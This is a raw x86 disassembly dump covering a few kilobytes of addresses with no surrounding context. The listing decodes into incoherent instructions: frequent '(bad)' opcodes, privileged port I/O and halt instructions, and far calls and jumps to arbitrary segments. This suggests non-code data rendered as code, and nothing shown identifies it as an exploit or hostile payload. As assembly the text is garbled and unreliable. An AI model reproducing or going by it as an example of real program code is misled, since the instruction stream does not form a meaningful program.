  427cf7:	scas   al,BYTE PTR es:[edi]
  427cf8:	mov    eax,0x9d84edb5
  427cfd:	sahf   
  427cfe:	jle    0x427cb0
  427d00:	xchg   BYTE PTR [edx-0x5e8e8d96],dh
  427d06:	jno    0x427cab
  427d08:	jmp    0x427d29
  427d0a:	push   0x3e612adb
  427d0f:	jle    0x427d48
  427d11:	mov    esi,0xee4bcb8
  427d16:	add    cl,dl
  427d18:	repz imul ebx,ebx,0xffbb7b26
  427d1f:	fisubr DWORD PTR [esi+0x4b]
  427d22:	in     eax,0x0
  427d24:	hlt    
  427d25:	arpl   WORD PTR [ebp+0x73],sp
  427d28:	or     BYTE PTR [ebp+ebx*8+0x5b6d3eb9],0xe1
  427d30:	push   esi
  427d31:	ficomp DWORD PTR [eax-0x40b37b05]
  427d37:	add    eax,0xbb617e74
  427d3c:	mov    al,0xb1
  427d3e:	imul   edi,DWORD PTR [edx+0x6c],0xd
  427d42:	fistp  QWORD PTR [eax+0x498974e4]
  427d48:	mov    eax,ds:0xe6500a15
  427d4d:	cli    
  427d4e:	pop    ds
  427d4f:	fisttp WORD PTR [ebx]
  427d51:	dec    ebx
  427d52:	sbb    ebp,DWORD PTR [ebp-0x40]
  427d55:	push   cs
  427d56:	or     al,0x34
  427d58:	retf   
  427d59:	mov    ds:0x146da555,eax
  427d5e:	ins    DWORD PTR es:[edi],dx
  427d5f:	mov    ah,0x73
  427d61:	sahf   
  427d62:	in     al,0x64
  427d64:	push   edx
  427d65:	loop   0x427d14
  427d67:	ins    DWORD PTR es:[edi],dx
  427d68:	pop    esp
  427d69:	mov    al,ds:0x5fb03c08
  427d6e:	dec    esi
  427d6f:	shl    DWORD PTR [edx],cl
  427d71:	out    dx,eax
  427d72:	sbb    eax,0x4bda3705
  427d77:	sbb    dl,0xc
  427d7a:	rcr    ebp,0x8a
  427d7d:	aas    
  427d7e:	mov    cl,0xb4
  427d80:	ins    DWORD PTR es:[edi],dx
  427d81:	lea    ebp,[ecx-0x73c51ca6]
  427d87:	xchg   esi,eax
  427d88:	add    eax,0x1b6b6d2b
  427d8d:	mov    cl,0x93
  427d8f:	retf   0x2c41
  427d92:	loopne 0x427d9f
  427d94:	sahf   
  427d95:	dec    ebx
  427d96:	and    DWORD PTR [eax+0x22],ebx
  427d99:	mov    dh,0xdf
  427d9b:	pop    esp
  427d9c:	xor    dl,0x61
  427d9f:	shl    DWORD PTR [eax],1
  427da1:	mov    dh,0x8d
  427da3:	lods   eax,DWORD PTR ds:[esi]
  427da4:	jo     0x427d50
  427da6:	imul   DWORD PTR [eax+0x29077d5b]
  427dac:	call   0x48155477
  427db1:	jb     0x427dda
  427db3:	and    al,0xb4
  427db5:	retf   
  427db6:	ror    BYTE PTR [eax-0x5772495b],1
  427dbc:	mov    bl,0x38
  427dbe:	or     ecx,DWORD PTR [ecx-0x44bae97d]
  427dc4:	mov    al,ds:0xcadd4b36
  427dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dca:	inc    ebx
  427dcb:	shl    DWORD PTR [esi+0x6b],0xf8
  427dcf:	add    al,0xd4
  427dd1:	test   ebx,esp
  427dd3:	push   ss
  427dd4:	push   ebp
  427dd5:	mov    ebx,0xf45b5bb5
  427dda:	sbb    eax,0x8815d98f
  427ddf:	das    
  427de0:	add    al,BYTE PTR [edi+0x64]
  427de3:	fisubr DWORD PTR [esi]
  427de5:	ins    BYTE PTR es:[edi],dx
  427de6:	dec    ebx
  427de7:	gs pop sp
  427dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427deb:	cwde   
  427dec:	inc    esp
  427ded:	scas   eax,DWORD PTR es:[edi]
  427dee:	mov    bh,BYTE PTR [edx+0x3620e8a3]
  427df4:	rcl    bh,0x15
  427df7:	pop    edx
  427df8:	jge    0x427e2e
  427dfa:	push   esp
  427dfb:	or     eax,DWORD PTR [ebp-0x7f]
  427dfe:	xor    bh,bl
  427e00:	out    0x5d,al
  427e02:	pop    eax
  427e03:	sub    BYTE PTR [eax+edi*1+0xa],al
  427e07:	mov    ebp,0xd2e0cbdc
  427e0c:	push   esi
  427e0d:	test   al,0xad
  427e0f:	mov    WORD PTR [edi+0x9],es
  427e12:	push   ebp
  427e13:	and    dh,al
  427e15:	sub    DWORD PTR [edi],edx
  427e17:	shr    DWORD PTR [esi+0x62cb2de0],0x1d
  427e1e:	mov    ecx,edx
  427e20:	scas   al,BYTE PTR es:[edi]
  427e21:	mov    BYTE PTR [ebx+0x6b],bl
  427e24:	int    0x9c
  427e26:	pop    ebx
  427e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e28:	mov    ebp,0x6a5dd2d
  427e2d:	fisubr DWORD PTR [eax-0x3794c093]
  427e33:	dec    esp
  427e34:	xchg   BYTE PTR [esi+0x2eaddad8],dl
  427e3a:	jg     0x427e01
  427e3c:	and    cl,BYTE PTR [ebp+0x26]
  427e3f:	mov    ch,0x34
  427e41:	loop   0x427ea3
  427e43:	(bad)  [esi]
  427e45:	mov    dh,0x91
  427e47:	loope  0x427dd9
  427e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e4a:	out    dx,eax
  427e4b:	ins    DWORD PTR es:[edi],dx
  427e4c:	jecxz  0x427e57
  427e4e:	inc    ebp
  427e4f:	mov    ah,0x1b
  427e51:	or     eax,0xe771bace
  427e56:	out    dx,eax
  427e57:	or     dh,ch
  427e59:	lds    ebp,FWORD PTR [ebp+0x35a09e1f]
  427e5f:	test   BYTE PTR [esi-0x75],bh
  427e62:	not    al
  427e64:	lods   eax,DWORD PTR ds:[esi]
  427e65:	fld    QWORD PTR [edi+0x6d]
  427e68:	pusha  
  427e69:	cmp    edx,edi
  427e6b:	popf   
  427e6c:	and    DWORD PTR [edi],ebp
  427e6e:	stc    
  427e6f:	out    0x50,eax
  427e71:	dec    ebx
  427e72:	mov    ah,0xdb
  427e74:	dec    ebp
  427e75:	push   ebx
  427e76:	sbb    al,0xee
  427e78:	pop    edi
  427e79:	adc    BYTE PTR [ebx],ah
  427e7b:	mov    eax,ds:0xde2c6b74
  427e80:	jnp    0x427e69
  427e82:	cmc    
  427e83:	sub    esp,ecx
  427e85:	or     BYTE PTR [eax+0x6d85a5b6],bh
  427e8b:	mov    bh,0xf8
  427e8d:	push   ebx
  427e8e:	(bad)  
  427e8f:	and    eax,0x677dbc12
  427e94:	stos   DWORD PTR es:[edi],eax
  427e95:	bound  ebp,QWORD PTR [ebx-0x23]
  427e98:	cmp    BYTE PTR [ebx+edi*1-0x12],ah
  427e9c:	mov    DWORD PTR [ebx+0xbb62399],esp
  427ea2:	pop    ebx
  427ea3:	das    
  427ea4:	or     al,0x40
  427ea6:	and    ah,BYTE PTR [eax-0x4810b4f5]
  427eac:	(bad)  
  427ead:	jbe    0x427e5a
  427eaf:	ins    DWORD PTR es:[edi],dx
  427eb0:	loop   0x427f1e
  427eb2:	imul   cl
  427eb4:	mov    edi,ecx
  427eb6:	add    ebx,0xffffffc4
  427eb9:	lea    esi,[esi-0x25]
  427ebc:	push   0x805122c
  427ec1:	xchg   ebp,eax
  427ec2:	push   ss
  427ec3:	mov    dh,0x3f
  427ec5:	(bad)  
  427ec6:	fist   DWORD PTR [esi]
  427ec8:	ficom  DWORD PTR ds:0x1f9ad16e
  427ece:	xor    dl,BYTE PTR [eax+0x6d51489b]
  427ed4:	test   eax,0x225003d8
  427ed9:	add    dh,BYTE PTR [edx+ebp*8+0x46]
  427edd:	adc    esi,DWORD PTR [ecx+0x19ef1dd5]
  427ee3:	in     eax,dx
  427ee4:	stos   BYTE PTR es:[edi],al
  427ee5:	mov    fs,WORD PTR [ecx+0x6b]
  427ee8:	pop    ss
  427ee9:	clc    
  427eea:	fst    QWORD PTR [eax-0x640a5161]
  427ef0:	or     BYTE PTR [edi-0x5e969cf3],dh
  427ef6:	je     0x427f05
  427ef8:	stc    
  427ef9:	sub    edx,esp
  427efb:	fnstenv [edi+0x60]
  427efe:	xchg   ebx,eax
  427eff:	retf   
  427f00:	(bad)  
  427f01:	shl    BYTE PTR [esi+0x20],cl
  427f04:	arpl   WORD PTR [esi+eax*8-0x7aea6b],sp
  427f0b:	dec    esp
  427f0c:	mov    dh,0x1a
  427f0e:	push   0x5388e94b
  427f13:	jb     0x427eeb
  427f15:	jmp    0x427eac
  427f17:	ins    DWORD PTR es:[edi],dx
  427f18:	dec    ebx
  427f19:	pop    ebx
  427f1a:	(bad)  ds:0xa4473bdb
  427f20:	pop    ss
  427f21:	call   0x2db9:0x6d1ba8b3
  427f28:	sub    al,0x1e
  427f2a:	push   ebx
  427f2b:	inc    ebp
  427f2c:	pop    ds
  427f2d:	fidiv  DWORD PTR [eax+0x2db46e7e]
  427f33:	call   0x4a93b5c3
  427f38:	cmc    
  427f39:	std    
  427f3a:	push   eax
  427f3b:	push   ecx
  427f3c:	mov    eax,0x4786c2d
  427f41:	cs (bad) 
  427f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f44:	test   al,0xcd
  427f46:	mov    ch,ah
  427f48:	fcmovnbe st,st(6)
  427f4a:	push   es
  427f4b:	mov    edx,0x2971b2eb
  427f50:	dec    edx
  427f51:	add    BYTE PTR ds:0x1b6d2eaf,al
  427f57:	or     esp,DWORD PTR [ecx-0x47]
  427f5a:	jnp    0x427fa7
  427f5c:	sbb    eax,0x6cea921b
  427f61:	fist   DWORD PTR [esi-0x1d]
  427f64:	(bad)  
  427f65:	(bad)  
  427f66:	cmp    esi,DWORD PTR [edi-0x61]
  427f69:	xor    BYTE PTR [ebp+0x6deba4e5],dh
  427f6f:	sbb    eax,DWORD PTR [eax]
  427f71:	outs   dx,BYTE PTR ds:[esi]
  427f72:	das    
  427f73:	adc    DWORD PTR [edx+ecx*8-0x13],0x5c
  427f78:	(bad)  
  427f79:	fbstp  TBYTE PTR [esi]
  427f7b:	mov    edx,0x4841a058
  427f80:	jecxz  0x427ffd
  427f82:	in     eax,dx
  427f83:	cmp    al,0xe2
  427f85:	adc    esi,DWORD PTR [ecx-0x15]
  427f88:	sub    ch,BYTE PTR [edi+0x36]
  427f8b:	inc    edi
  427f8c:	outs   dx,BYTE PTR ds:[esi]
  427f8d:	pushf  
  427f8e:	gs cs ins BYTE PTR es:[edi],dx
  427f91:	test   DWORD PTR [ebp+0x52],ebp
  427f94:	inc    ebp
  427f95:	ja     0x427fab
  427f97:	pop    ebx
  427f98:	sbb    ah,BYTE PTR [esi-0x45fe0512]
  427f9e:	or     BYTE PTR [esi],ch
  427fa0:	adc    al,0x49
  427fa2:	add    al,0xb3
  427fa4:	push   edi
  427fa5:	push   esi
  427fa6:	or     DWORD PTR [eax-0x59fe9f5f],esp
  427fac:	sub    al,0x25
  427fae:	leave  
  427faf:	jmp    0xf573:0xf38956c6
  427fb6:	int3   
  427fb7:	jbe    0x428017
  427fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fba:	lea    ebp,[ebp-0x65f15372]
  427fc0:	das    
  427fc1:	jmp    0xda2d:0xdb0b1749
  427fc8:	push   ss
  427fc9:	call   0xe8a1:0x5d632d7d
  427fd0:	xor    al,0xa
  427fd2:	(bad)  
  427fd3:	add    al,0x70
  427fd5:	imul   eax,DWORD PTR [edx],0xffffffe0
  427fd8:	mov    ecx,0x3ef8925f
  427fdd:	mov    ebx,0x67ea1845
  427fe2:	sbb    al,0xeb
  427fe4:	shr    BYTE PTR [ebx+0x6c2c958f],1
  427fea:	in     eax,dx
  427feb:	push   edx
  427fec:	cmp    BYTE PTR ds:0x19e89b1,cl
  427ff2:	(bad)  
  427ff3:	not    al
  427ff5:	cs sub al,0x2c
  427ff8:	pop    ds
  427ff9:	xor    al,0x1
  427ffb:	outs   dx,DWORD PTR ds:[esi]
  427ffc:	xor    DWORD PTR [esi+edx*4-0x50],ebx
  428000:	gs jmp 0x428045
  428003:	mov    ebx,0x32ea1794
  428008:	mov    dl,0xdd
  42800a:	shr    bl,0x89
  42800d:	cs mov eax,0x12e96db4
  428013:	mov    WORD PTR [eax],ds
  428015:	cwde   
  428016:	pop    ebx
  428017:	int    0x1f
  428019:	mov    cl,0xdc
  42801b:	fidiv  DWORD PTR [esi-0x226ff12b]
  428021:	xor    al,0x2e
  428023:	xchg   ebp,eax
  428024:	sbb    eax,0xdb6a7c0d
  428029:	inc    eax
  42802a:	imul   DWORD PTR [esi-0x96c0d81]
  428030:	sub    ch,al
  428032:	mov    dh,0x6d
  428034:	xor    al,0x10
  428036:	ja     0x42803e
  428038:	or     DWORD PTR [eax-0x2c],esp
  42803b:	(bad)  
  42803c:	push   cs
  42803d:	sbb    dl,BYTE PTR [ecx]
  42803f:	fcmovnbe st,st(2)
  428041:	and    ebp,ebx
  428043:	sbb    bl,BYTE PTR [edx]
  428045:	cmp    eax,0x10d1d0a3
  42804a:	fisttp QWORD PTR [eax]
  42804c:	adc    al,ah
  42804e:	jbe    0x42807b
  428050:	cmp    al,0xc6
  428052:	mov    eax,0xd0be50b0
  428057:	add    al,0x0
  428059:	in     al,0x5f
  42805b:	test   eax,0xa5c2a37f
  428060:	fcmovnbe st,st(6)
  428062:	mov    dh,0x55
  428064:	jns    0x428021
  428066:	call   0x332c:0x94f702cb
  42806d:	aam    0xad
  42806f:	add    al,0xb5
  428071:	ja     0x428041
  428073:	dec    esi
  428074:	pop    ss
  428075:	pop    ebp
  428076:	mov    ecx,0x746dbb4
  42807b:	stc    
  42807c:	push   ds
  42807d:	call   DWORD PTR ds:0x1a0c380b
  428083:	mov    dh,0xb1
  428085:	sub    eax,0xf24ddf2d
  42808a:	cli    
  42808b:	and    BYTE PTR [esi],bh
  42808d:	cmp    al,0xe8
  42808f:	mov    esp,0xc02a0d6d
  428094:	pop    eax
  428095:	call   0x46677028
  42809a:	mov    ch,0xb4
  42809c:	sub    eax,0xca78911
  4280a1:	cwde   
  4280a2:	sbb    eax,0x1a2eb655
  4280a7:	fstp   TBYTE PTR [eax-0x2715ed50]
  4280ad:	ins    DWORD PTR es:[edi],dx
  4280ae:	lods   eax,DWORD PTR ds:[esi]
  4280af:	mov    esp,0xdb52d2d2
  4280b4:	lds    edx,FWORD PTR [ebp-0x71c5298]
  4280ba:	cld    
  4280bb:	jecxz  0x42809a
  4280bd:	fdivr  DWORD PTR [edx-0x343e6d18]
  4280c3:	and    eax,0xb190d277
  4280c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280c9:	jbe    0x42812e
  4280cb:	popa   
  4280cc:	mov    eax,ds:0x67118208
  4280d1:	mov    ?,WORD PTR [esi+ebx*2-0x7d69a94c]
  4280d8:	xchg   esi,eax
  4280d9:	mov    dh,0x6e
  4280db:	push   edx
  4280dc:	push   eax
  4280dd:	test   BYTE PTR [ecx-0x492497e9],bh
  4280e3:	add    ebx,DWORD PTR [ecx+0x6220b7b5]
  4280e9:	into   
  4280ea:	adc    al,0x7a
  4280ec:	in     eax,dx
  4280ed:	push   edx
  4280ee:	inc    ebx
  4280ef:	ffree  st(3)
  4280f1:	fild   QWORD PTR [edx]
  4280f3:	fist   WORD PTR [esi]
  4280f5:	jmp    0x8562c873
  4280fa:	dec    ebx
  4280fb:	or     ebx,DWORD PTR [ebx]
  4280fd:	xchg   ebx,eax
  4280fe:	push   0xffffffbe
  428100:	and    BYTE PTR [ebx-0x44],ch
  428103:	adc    edi,DWORD PTR [edi+0x1a]
  428106:	mov    ds:0xeff40b6e,al
  42810b:	pop    ss
  42810c:	dec    ecx
  42810d:	xchg   BYTE PTR [ebx+0xd],ah
  428110:	or     ebx,DWORD PTR [ebx+0x61]
  428113:	sub    ecx,esi
  428115:	lods   al,BYTE PTR ds:[esi]
  428116:	cs jno 0x428142
  428119:	dec    edi
  42811a:	in     eax,dx
  42811b:	ins    DWORD PTR es:[edi],dx
  42811c:	mov    bh,0x86
  42811e:	test   al,0x7d
  428120:	adc    eax,0xe8cb5c70
  428125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428126:	adc    BYTE PTR [ebx+0x17],bl
  428129:	je     0x428196
  42812b:	jmp    0x4280b9
  42812d:	das    
  42812e:	shl    DWORD PTR [ebx-0x57e246ee],0xd
  428135:	call   0x51b9:0x490079aa
  42813c:	arpl   WORD PTR [ebx+0x0],bp
  42813f:	push   ss
  428140:	sbb    esi,DWORD PTR [edi-0x31]
  428143:	mov    al,0x4a
  428145:	rcr    BYTE PTR [edx+0x75],0x11
  428149:	fld    TBYTE PTR [ebp+0x56]
  42814c:	add    ch,BYTE PTR [eax]
  42814e:	jb     0x4281bb
  428150:	sub    DWORD PTR ds:0xc2ed15a7,ecx
  428156:	mov    dh,0x32
  428158:	xchg   esi,eax
  428159:	or     BYTE PTR [ebx],bh
  42815b:	adc    BYTE PTR [ebx-0x3a],ah
  42815e:	sbb    eax,0xb11c836
  428163:	test   al,0x6c
  428165:	pop    ecx
  428166:	dec    ecx
  428167:	jns    0x4281c5
  428169:	fdiv   DWORD PTR [esi]
  42816b:	ss adc eax,0xddca54af
  428171:	hlt    
  428172:	inc    ebx
  428173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428174:	dec    eax
  428175:	fnsave [esi-0x108d493]
  42817b:	into   
  42817c:	retf   
  42817d:	cmp    al,0x68
  42817f:	(bad)  [ecx+ebp*1-0x75aab4a1]
  428186:	lods   eax,DWORD PTR ds:[esi]
  428187:	cmp    edx,DWORD PTR [edi]
  428189:	call   0x346d:0xb206353d
  428190:	inc    eax
  428191:	into   
  428192:	cmp    al,0x2a
  428194:	jne    0x4281f2
  428196:	pop    es
  428197:	sub    eax,0x19db041a
  42819c:	push   esi
  42819d:	xchg   DWORD PTR [esi+0x48],ebx
  4281a0:	pop    eax
  4281a1:	mov    al,ds:0x5b2b6dd
  4281a6:	cli    
  4281a7:	gs fsubr st,st(3)
  4281aa:	pop    ss
  4281ab:	push   ecx
  4281ac:	fwait
  4281ad:	lods   eax,DWORD PTR ds:[esi]
  4281ae:	jbe    0x42815b
  4281b0:	pop    ebp
  4281b1:	sub    BYTE PTR [esi+0x22],al
  4281b4:	jno    0x428150
  4281b6:	jbe    0x428162
  4281b8:	in     al,dx
  4281b9:	pop    ds
  4281ba:	pusha  
  4281bb:	mov    eax,ds:0xb65cb6dd
  4281c0:	pop    ebp
  4281c1:	fiadd  DWORD PTR [ecx]
  4281c3:	fcomp  DWORD PTR [ecx+0x55]
  4281c6:	mov    ecx,0xdd01d850
  4281cb:	stos   BYTE PTR es:[edi],al
  4281cc:	xchg   ebx,eax
  4281cd:	push   0xffffffbe
  4281cf:	cld    
  4281d0:	add    esi,DWORD PTR [ebx-0x5d]
  4281d3:	fstp   QWORD PTR [eax+0x30]
  4281d6:	jmp    0x35b7:0xf6279f5e
  4281dd:	in     al,0x36
  4281df:	cs jge 0x428253
  4281e2:	popf   
  4281e3:	or     DWORD PTR [edi],0x31d9056e
  4281e9:	add    ebp,DWORD PTR [edx+0x1adb6d8]
  4281ef:	sub    BYTE PTR [ebx+0x62],dl
  4281f2:	mov    ds:0xa6da3def,al
  4281f7:	pop    ebx
  4281f8:	add    esi,DWORD PTR [ebp-0x530298a4]
  4281fe:	and    al,0x90
  428200:	loopne 0x4281e8
  428202:	fwait
  428203:	ins    DWORD PTR es:[edi],dx
  428204:	inc    eax
  428205:	mov    ah,0x5b
  428207:	mov    eax,0x688cf9bc
  42820c:	dec    ecx
  42820d:	pop    edx
  42820e:	mov    eax,0x25f2a17c
  428213:	pop    ebx
  428214:	dec    esi
  428215:	add    BYTE PTR [ecx],dh
  428217:	mov    ebp,0xdb04b227
  42821c:	sub    BYTE PTR [edx+0x28],ch
  42821f:	cwde   
  428220:	mov    DWORD PTR [ebx],ebp
  428222:	call   0x3156:0xd1068538
  428229:	jmp    0xb636:0xdd6a6a41
  428230:	ffreep st(2)
  428232:	adc    ch,0xb6
  428235:	dec    edx
  428236:	sbb    edx,DWORD PTR [edx+0x636ddaaf]
  42823c:	pop    ebx
  42823d:	fld    QWORD PTR [ebx-0x32]
  428240:	or     ch,BYTE PTR [ebx+0x69f1fe8b]
  428246:	adc    DWORD PTR [eax+0x2dc05d],esp
  42824c:	fiadd  DWORD PTR [ebx]
  42824e:	mov    ebp,0x68251cc5
  428253:	pop    ebx
  428254:	push   0xfffffff2
  428256:	rcl    DWORD PTR [ebp+0x78d638c0],1
  42825c:	pop    ss
  42825d:	dec    ebp
  42825e:	xchg   esp,eax
  42825f:	test   DWORD PTR [esi],esp
  428261:	sbb    DWORD PTR [eax+0x17184216],ecx
  428267:	rol    BYTE PTR [esi-0x29],0x54
  42826b:	fs cmp ecx,ecx
  42826e:	out    dx,eax
  42826f:	dec    esp
  428270:	(bad)  
  428271:	in     eax,0xed
  428273:	inc    edx
  428274:	clc    
  428275:	pop    es
  428276:	inc    eax
  428277:	jge    0x42820b
  428279:	adc    al,BYTE PTR [eax]
  42827b:	pop    ebp
  42827c:	out    dx,eax
  42827d:	or     edi,ebx
  42827f:	lea    ecx,ds:0xbfe6d2c1
  428285:	sub    BYTE PTR [edi],0x50
  428288:	jne    0x42827d
  42828a:	fdiv   DWORD PTR [esi+0x3f885b1b]
  428290:	daa    
  428291:	div    edx
  428293:	lods   eax,DWORD PTR es:[esi]
  428295:	add    bh,BYTE PTR [ebx+0x50bb608e]
  42829b:	jae    0x428228
  42829d:	ins    BYTE PTR es:[edi],dx
  42829e:	pop    eax
  42829f:	imul   ebx,DWORD PTR [edx+0x46],0x4d
  4282a3:	add    al,0x37
  4282a5:	mov    dh,0x85
  4282a7:	inc    esp
  4282a8:	cmp    ecx,edi
  4282aa:	aam    0xfc
  4282ac:	scas   al,BYTE PTR es:[edi]
  4282ad:	aam    0x5b
  4282af:	mov    ebx,0x9ffe6c6d
  4282b4:	jb     0x4282e1
  4282b6:	adc    DWORD PTR [edx+0x6f],ebp
  4282b9:	sahf   
  4282ba:	pop    edi
  4282bb:	mov    ds:0x452c3885,al
  4282c0:	out    0x68,al
  4282c2:	mov    esi,0xda971151
  4282c7:	lods   eax,DWORD PTR ds:[esi]
  4282c8:	ror    DWORD PTR ds:0xd7ce0522,0xd8
  4282cf:	retf   0xb6c2
  4282d2:	ins    DWORD PTR es:[edi],dx
  4282d3:	dec    ebp
  4282d4:	or     DWORD PTR [esi-0x17],ecx
  4282d7:	sub    al,0x23
  4282d9:	daa    
  4282da:	je     0x42827c
  4282dc:	and    eax,0xdb4b5c37
  4282e1:	sbb    DWORD PTR [ebx-0x5ce9bb1e],0x6154a7c3
  4282eb:	test   eax,0xc83e6d6d
  4282f0:	cli    
  4282f1:	shl    esi,1
  4282f3:	add    eax,0xa95bcab1
  4282f8:	xchg   esi,eax
  4282f9:	jg     0x428311
  4282fb:	fwait
  4282fc:	add    dh,cl
  4282fe:	in     eax,0x0
  428300:	add    ebp,DWORD PTR [edi]
  428302:	mov    eax,ds:0xbad8767d
  428307:	test   al,0xb
  428309:	dec    ecx
  42830a:	call   0x11fec896
  42830f:	ins    DWORD PTR es:[edi],dx
  428310:	test   al,0xd
  428312:	inc    ecx
  428313:	pop    ebp
  428314:	and    eax,0x78bfa68e
  428319:	pop    ds
  42831a:	outs   dx,BYTE PTR ds:[esi]
  42831b:	mov    al,0x1
  42831d:	cmp    BYTE PTR [edi+eiz*4-0x177061f6],ah
  428324:	xor    eax,0x71d156d4
  428329:	adc    bl,BYTE PTR [ebx+0x3d]
  42832c:	adc    eax,0xb85a08ec
  428331:	xchg   ah,bl
  428333:	fnstsw WORD PTR [edi+ebx*1+0x18]
  428337:	loopne 0x4282bd
  428339:	(bad)  
  42833a:	inc    ebp
  42833b:	jo     0x4283a8
  42833d:	jle    0x4283ad
  42833f:	pop    eax
  428340:	sar    BYTE PTR [ebp+0x52],cl
  428343:	es inc ebx
  428345:	jne    0x4282ea
  428347:	stos   DWORD PTR es:[edi],eax
  428348:	(bad)  
  428349:	popa   
  42834a:	add    esp,DWORD PTR [ebx-0x47]
  42834d:	jge    0x42830f
  42834f:	test   DWORD PTR [esi],ecx
  428351:	push   0x3
  428353:	push   eax
  428354:	ret    0x196b
  428357:	pop    esi
  428358:	mov    cl,0x28
  42835a:	adc    al,0x6d
  42835c:	adc    edx,DWORD PTR [edx-0x2dbee888]
  428362:	sbb    ebp,DWORD PTR [ebp+0x76508d0b]
  428368:	dec    ebp
  428369:	popa   
  42836a:	call   0xdba1b568
  42836f:	lods   eax,DWORD PTR ds:[esi]
  428370:	adc    al,0x4f
  428372:	imul   esp,DWORD PTR [ecx-0x65f72b27],0xffffff86
  428379:	sub    ebp,ebp
  42837b:	add    cl,BYTE PTR [eax+0x3cb9e86c]
  428381:	sub    al,0x74
  428383:	jo     0x4283f0
  428385:	retf   
  428386:	jbe    0x428336
  428388:	test   eax,0xceaccd11
  42838d:	or     BYTE PTR [esi-0x25ff9b20],dl
  428393:	push   eax
  428394:	mov    ds,WORD PTR [ecx+0x7d]
  428397:	aam    0x3f
  428399:	mov    eax,0xd319a144
  42839e:	or     eax,0xf13874fb
  4283a3:	js     0x42832a
  4283a5:	mov    dh,0x5d
  4283a7:	push   0xbc3f28e3
  4283ac:	xchg   edx,eax
  4283ad:	cmpxchg BYTE PTR ds:0x85ad85d6,ah
  4283b4:	repnz add DWORD PTR [esi-0x76231581],esp
  4283bb:	leave  
  4283bc:	cli    
  4283bd:	cs xor al,0x0
  4283c0:	mov    dh,0x4a
  4283c2:	inc    esi
  4283c3:	ss popa 
  4283c5:	pushf  
  4283c6:	in     al,0x4d
  4283c8:	shl    BYTE PTR [esi+0x2f0f5421],1
  4283ce:	dec    ebp
  4283cf:	and    al,0xab
  4283d1:	jo     0x428389
  4283d3:	fcmovnbe st,st(6)
  4283d5:	mov    dh,0x94
  4283d7:	sub    DWORD PTR ds:0xec8174ad,ebx
  4283dd:	hlt    
  4283de:	scas   eax,DWORD PTR es:[edi]
  4283df:	mov    esp,0x81adc46
  4283e4:	push   ss
  4283e5:	xchg   ecx,eax
  4283e6:	dec    esp
  4283e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283e8:	xor    DWORD PTR [esi+ebp*2+0x742c45cd],ecx
  4283ef:	push   ebp
  4283f0:	dec    eax
  4283f1:	push   ds
  4283f2:	pop    es
  4283f3:	xchg   ecx,eax
  4283f4:	je     0x428459
  4283f6:	imul   ebp,DWORD PTR [ebx+0x47],0x23
  4283fa:	add    eax,0xcf8d8864
  4283ff:	push   ebp
  428400:	inc    edi
  428401:	jo     0x428464
  428403:	test   eax,0xac735cdd
  428408:	shl    DWORD PTR [edi+0x1c],0xdb
  42840c:	inc    edx
  42840d:	mov    ebx,0x4aedf445
  428412:	or     DWORD PTR [eax+0x320e218b],eax
  428418:	sub    BYTE PTR [esi],ch
  42841a:	ins    BYTE PTR es:[edi],dx
  42841b:	mov    ah,0x27
  42841d:	sbb    dh,BYTE PTR [edx-0x14]
  428420:	jg     0x42849b
  428422:	adc    edx,DWORD PTR [ecx-0x23]
  428425:	or     bh,BYTE PTR [ebx-0x55df106]
  42842b:	mov    eax,ds:0xb6ed6dfb
  428430:	ins    DWORD PTR es:[edi],dx
  428431:	xor    al,0xa2
  428433:	sbb    eax,0x7f0539cf
  428438:	ja     0x4283bf
  42843a:	out    0x47,al
  42843c:	aam    0x26
  42843e:	mov    edx,0xadbfabb5
  428443:	or     esp,esp
  428445:	cld    
  428446:	pop    edi
  428447:	add    al,0x63
  428449:	fld    TBYTE PTR [edx-0xbd9f9a4]
  42844f:	push   esi
  428450:	in     eax,dx
  428451:	xchg   DWORD PTR [ebx-0x3b],ebx
  428454:	shl    DWORD PTR [esi-0x80],cl
  428457:	jns    0x4284c1
  428459:	aas    
  42845a:	jmp    0xf057af8
  42845f:	sbb    BYTE PTR ds:0x9a9deb40,0xc7
  428466:	pop    ebx
  428467:	mov    ebx,0x331b552d
  42846c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42846d:	mov    cl,0x9b
  42846f:	inc    ecx
  428470:	pop    ecx
  428471:	xchg   edi,eax
  428472:	pop    ebx
  428473:	shl    DWORD PTR [esi+0x2dd58b5],cl
  428479:	lods   eax,DWORD PTR ds:[esi]
  42847a:	adc    esi,ecx
  42847c:	push   cs
  42847d:	dec    BYTE PTR [ebx]
  42847f:	and    ebx,eax
  428481:	push   0xb
  428483:	dec    ebx
  428484:	add    dh,BYTE PTR [edx+0x76a4a46a]
  42848a:	xor    BYTE PTR [ecx-0x2c],al
  42848d:	inc    esp
  42848e:	pop    esp
  42848f:	sbb    al,0xb5
  428491:	shr    BYTE PTR [eax+0x36],cl
  428494:	pop    ebx
  428495:	fisttp DWORD PTR [edx+0x65a402ad]
  42849b:	xor    BYTE PTR [edi-0x3b],al
  42849e:	xchg   ebp,eax
  42849f:	stos   BYTE PTR es:[edi],al
  4284a0:	aad    0x6e
  4284a2:	sub    eax,0xeed5c86c
  4284a7:	js     0x42851c
  4284a9:	(bad)  
  4284aa:	mov    ah,0x59
  4284ac:	mov    eax,ds:0x2116dadd
  4284b1:	sbb    DWORD PTR [edi-0x13d6a420],esp
  4284b7:	jae    0x428498
  4284b9:	fisub  DWORD PTR [ebp-0x67ef908a]
  4284bf:	mov    ebx,fs
  4284c1:	mov    ecx,0xec5844a1
  4284c6:	add    BYTE PTR [esi-0x55],bh
  4284c9:	cli    
  4284ca:	shl    dl,0xc3
  4284cd:	add    dh,dh
  4284cf:	stos   DWORD PTR es:[edi],eax
  4284d0:	rcr    BYTE PTR [ebx],0x4b
  4284d3:	adc    eax,0xab92c64a
  4284d8:	lods   eax,DWORD PTR ds:[esi]
  4284d9:	pop    eax
  4284da:	cmp    edi,DWORD PTR [edx-0x334faac]
